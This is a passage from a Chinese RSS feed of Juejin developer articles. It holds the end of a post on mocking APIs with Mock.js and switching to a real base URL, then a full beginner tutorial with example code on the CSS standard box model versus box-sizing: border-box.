<p>前端可以专注于页面交互和用户体验，不用被后端进度拖累。</p>
<h2 data-id="heading-14">实际开发中的注意事项</h2>
<h3 data-id="heading-15">1. Mock数据要接近真实</h3>
<p>Mock的数据格式要尽量和真实接口保持一致，否则后面对接口时会有麻烦。</p>
<h3 data-id="heading-16">2. 接口文档要明确</h3>
<p>前后端最好先确定好接口文档，包括：</p>
<ul>
<li>请求路径</li>
<li>请求方法</li>
<li>参数格式</li>
<li>返回数据结构</li>
</ul>
<h3 data-id="heading-17">3. 错误处理也要Mock</h3>
<p>不仅要Mock正常情况，还要Mock错误情况，比如网络错误、参数错误等。</p>
<h2 data-id="heading-18">真实接口来了怎么办？</h2>
<p>当后端接口开发完成后，只需要修改请求的基础URL：</p>
<p>javascript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 开发环境用Mock</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">BASE_URL</span> = <span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">env</span>.<span class="hljs-property">DEV</span> ? <span class="hljs-string">''</span> : <span class="hljs-string">'https://api.real.com'</span>

<span class="hljs-comment">// 发请求</span>
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">`<span class="hljs-subst">${BASE_URL}</span>/api/posts?page=1&amp;limit=10`</span>)
</code></pre>
<p>或者在axios中配置：</p>
<p>javascript</p>
<pre><code class="hljs language-ini" lang="ini">// 开发环境
if (<span class="hljs-attr">process.env.NODE_ENV</span> === <span class="hljs-string">'development'</span>) {
  <span class="hljs-attr">axios.defaults.baseURL</span> = <span class="hljs-string">''</span>  // Mock接口
} else {
  <span class="hljs-attr">axios.defaults.baseURL</span> = <span class="hljs-string">'https://api.real.com'</span>  // 真实接口
}
</code></pre>
<h2 data-id="heading-19">小结</h2>
<p>通过Mock.js，前端开发者可以：</p>
<ul>
<li>摆脱对后端的依赖</li>
<li>快速验证UI和交互</li>
<li>提高开发效率</li>
<li>更好地测试各种场景</li>
</ul>
<p>这种开发模式已经成为现代前端开发的标准做法。下次再遇到后端没写完接口的情况，你就可以自信地说："没关系，我自己造数据！"</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[CSS 盒子又“炸”了？一文看懂标准盒模型 vs 怪异盒模型]]></title>    <link>https://juejin.cn/post/7597634458696744966</link>    <guid>https://juejin.cn/post/7597634458696744966</guid>    <pubDate>2026-01-21T09:40:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597634458696744966" data-draft-id="7597318159762899007" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="CSS 盒子又“炸”了？一文看懂标准盒模型 vs 怪异盒模型"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-21T09:40:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Flinton"/> <meta itemprop="url" content="https://juejin.cn/user/2225067266677640"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            CSS 盒子又“炸”了？一文看懂标准盒模型 vs 怪异盒模型
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2225067266677640/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Flinton
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T09:40:04.000Z" title="Wed Jan 21 2026 09:40:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>大家好，我叫【小奇腾】，你们有没有遇到过这种情况？明明设置了两个 <code>width: 50%</code> 的盒子想让它们并排，结果右边那个死活都要掉到下一行去？</p>
<p>难道是 <code>50% + 50% &gt; 100%</code>？数学老师骗了我们？ 不，是 <strong>CSS 盒模型</strong> 在“欺骗”你的眼睛。</p>
<p>今天这节课，我们不背枯燥的概念</p>
</blockquote>
<p>本期详细的视频教程bilibili：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV11nzjBnEUM%2F%3Fvd_source%3D4213d38d889ea1581bbcae78a04cbd9d" target="_blank" title="https://www.bilibili.com/video/BV11nzjBnEUM/?vd_source=4213d38d889ea1581bbcae78a04cbd9d" ref="nofollow noopener noreferrer">CSS 盒子又“炸”了？一文看懂标准盒模型 vs 怪异盒模型</a></p>
<h2 data-id="heading-0">一、盒子的“解剖学”：洋葱是怎么剥开的？</h2>
<p>在开始区分”标准盒模型 vs 怪异盒模型“之前，我们先了解什么是盒子模型的基本组成，想象你现在手里拿着一个<strong>橘子🍊</strong>，准备送给朋友。CSS 的盒子模型（Box Model）和这个橘子🍊一模一样，由<strong>从内到外</strong>的四层组成：</p>
<ul>
<li>
<p><strong>Content（果肉）</strong> ：最核心好吃的那个部分</p>
</li>
<li>
<p><strong>Padding（果皮）</strong> ：保护果肉的缓冲层。<strong>注意：果皮和果肉是一体的</strong>，果肉烂了（背景色），果皮通常也是那个颜色。</p>
</li>
<li>
<p><strong>Border（包装盒）</strong> ：最外层的硬壳。它是橘子和外界的<strong>分界线</strong>。</p>
</li>
<li>
<p><strong>Margin（社交距离）</strong> ：这一箱橘子和那一箱苹果之间，必须留出的<strong>空气缝隙</strong>。</p>
</li>
</ul>
<blockquote>
<p><strong>划重点</strong>：Margin 是用来推开别人的，不属于盒子本身的大小；而 Content + Padding + Border 才是盒子自己的“肉身”。</p>
</blockquote>
<h3 data-id="heading-1">盒子模型的示意图</h3>
<p>在浏览器，自己写一个盒子,然后通过检查工具，就可以看到盒子模型的样子。</p>
<pre><code class="hljs language-html" lang="html">.box {
    width: 200px;
    height: 200px;
    border: 10px solid #ccc;
    padding: 30px;
    margin: 20px;
}

<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"box"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<ul>
<li>盒子模型图</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/411ced1b47004e7c86ff41cbc295b257~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmxpbnRvbg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593204&amp;x-signature=yQqN6MhTjnJkep325AUdSc7SpCU%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li>盒子模型的每个部分(当我的鼠标放在盒子模型上)
<ul>
<li>content(内容区) <code>宽度200 x 高度200</code></li>
<li>padding(内边距) <code>4个内边距都是 30</code></li>
<li>border(边框) <code>4条边框都是 10</code></li>
<li>margin(外边距) <code>4个外边距都是 20</code></li>
</ul>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d2675373525045afa8d808d89f6124c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmxpbnRvbg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593204&amp;x-signature=C4QyYHj7st6Nt1Yqk0L1%2FW32mDo%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-2">二、 直觉的陷阱：你要买多大的橘子？</h2>
<p>在我们的直觉里，如果我们买一个宽 <code>100px</code> 的盒子，那这个盒子占的地方应该就是 <code>100px</code>，对吧？</p>
<p>但在 CSS 的<strong>标准盒模型（Standard Box Model）</strong> 里，逻辑是反直觉的。</p>
<h3 data-id="heading-3">🍊 橘子比喻</h3>
<p>想象你去买橘子。</p>
<ul>
<li><strong>Content（内容区）</strong> ：是橘子果肉。</li>
<li><strong>Padding（内边距）</strong> ：是橘子皮。</li>
<li><strong>Border（边框）</strong> ：是包装盒。</li>
</ul>
<p>当你写下 <code>width: 100px</code> 时，你以为你控制了整个橘子的大小。 <strong>实际上，你只控制了“橘子果肉”的大小。</strong></p>
<p>如果你给这个橘子穿上 <code>20px</code> 厚的皮（padding），再套上 <code>5px</code> 厚的壳（border）。 <strong>浏览器是这样算账的（做加法）：</strong></p>
<blockquote>
<p><strong>实际占地宽度</strong> = 果肉(100) + 左皮(20) + 右皮(20) + 左壳(5) + 右壳(5) <strong>结果</strong> = <strong>150px！</strong></p>
</blockquote>
<h3 data-id="heading-4">💥 案发现场</h3>
<p>你有一个盒子里面装了两个子盒子，里面两个子盒子你设置了 <code>width: 50%</code>，但只要你加了一丁点 <code>padding</code> 或 <code>border</code>，这个盒子的实际宽度就变成了 <code>50% + 皮</code>。 两个胖子挤在一起，总宽度超过了 100%，父容器装不下，右边的胖子就被挤下去了。这就是<strong>标准盒模型</strong>给新手挖的最大的坑。</p>
<h3 data-id="heading-5">代码示例</h3>
<p>从代码中，可以看到给两个子元素都给的50%的宽度，按道理是应该平并排在.box这个父盒子里的，但是却掉下来了一个.</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
        <span class="hljs-selector-class">.box</span> {
            <span class="hljs-attribute">width</span>: <span class="hljs-number">1000px</span>;
            <span class="hljs-attribute">display</span>: flex;
            <span class="hljs-attribute">flex-wrap</span>: wrap;
            <span class="hljs-attribute">border</span>: <span class="hljs-number">4px</span> solid purple;
        }

        <span class="hljs-selector-class">.left</span> {
            <span class="hljs-attribute">width</span>: <span class="hljs-number">50%</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
            <span class="hljs-attribute">border</span>: <span class="hljs-number">5px</span> solid <span class="hljs-number">#ccc</span>;
            <span class="hljs-attribute">background-color</span>: red;
        }

        <span class="hljs-selector-class">.right</span> {
            <span class="hljs-attribute">width</span>: <span class="hljs-number">50%</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
            <span class="hljs-attribute">border</span>: <span class="hljs-number">5px</span> solid blue;
            <span class="hljs-attribute">background-color</span>: green;
        }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"box"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"left"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"right"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>

<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>效果图:</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/da59627781a047b08b419511d24e438c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmxpbnRvbg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593204&amp;x-signature=vx4nATVrl2XRLwmsF6T7w1MwpC4%3D" loading="lazy"/>
<h2 data-id="heading-6">二、 救星登场：怪异盒模型（Border-box）</h2>
<p>为了解决这个问题，CSS 提供了一个属性，虽然它以前被称为“怪异盒模型”（Quirks Mode），但我觉得它应该叫**“省心盒模型”**。</p>
<p>即：<code>box-sizing: border-box;</code></p>
<h3 data-id="heading-7">📦 快递箱比喻</h3>
<p>在这个模式下，盒子就像一个<strong>快递箱</strong>。 当你写下 <code>width: 100px</code> 时，<strong>这个箱子死锁就是 100px 宽</strong>，雷打不动。</p>
<p>如果你非要往里面塞 <code>20px</code> 的泡沫（padding）：</p>
<ul>
<li>泡沫可以被压缩，箱子外壳不会变大（不会撑破布局）。</li>
<li><strong>只能委屈里面的空间（Content）变小</strong>。</li>
</ul>
<h3 data-id="heading-8">计算这里发生了什么</h3>
<p>还是刚才的数据，但这次我们加上了 <code>box-sizing: border-box</code> 给到两个子盒子；</p>
<ul>
<li>
<p><strong>CSS 设置</strong>：<code>width: 100px</code>, <code>padding: 20px</code>, <code>border: 5px</code></p>
</li>
<li>
<p><strong>浏览器实际渲染宽度</strong>：<strong>100px</strong>（不用算了，就是它！）</p>
</li>
<li>
<p><strong>里面的内容还能剩多少空间？</strong></p>
<blockquote>
<p>100px (总宽) - 40px (左右皮) - 10px (左右壳) = <strong>50px</strong></p>
</blockquote>
</li>
</ul>
<p>虽然内容区被挤小了，但你的页面布局稳如泰山，绝对不会乱跑！</p>
<h2 data-id="heading-9">三、 终极一招：一行代码走天下</h2>
<p>在实际开发中，我们不想每次写个 <code>div</code> 都要掏出计算器算宽度。怪异盒模型”好用也更符合直觉， 比如淘宝、京东页面，前端工程师们都会在CSS的第一行加上<code>box-sizing: border-box</code>。</p>
<p><strong>这句话翻译过来就是：</strong></p>
<blockquote>
<p>“浏览器你给我听好了！从现在开始，我说这个盒子宽 100px，它就是 100px。不管我加多少内边距和边框，你都得自己在内部消化，绝对不准把盒子撑大！”</p>
</blockquote>
<h2 data-id="heading-10">四、总结一下</h2>
<ol>
<li><strong>盒子四要素</strong>：Content（橘子果肉）、Padding（橘子果皮）、Border（包装壳）、Margin（橘子和其他物品距离）。</li>
<li><strong>标准盒模型</strong>：<code>width</code> 只管肉，加皮会变胖（容易炸布局）。</li>
<li><strong>怪异盒模型</strong>：<code>width</code> 管整体，加皮肉变少（布局超稳定）。</li>
<li><strong>建议</strong>：开局一条 <code>box-sizing: border-box</code>，写代码少掉很多头发。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>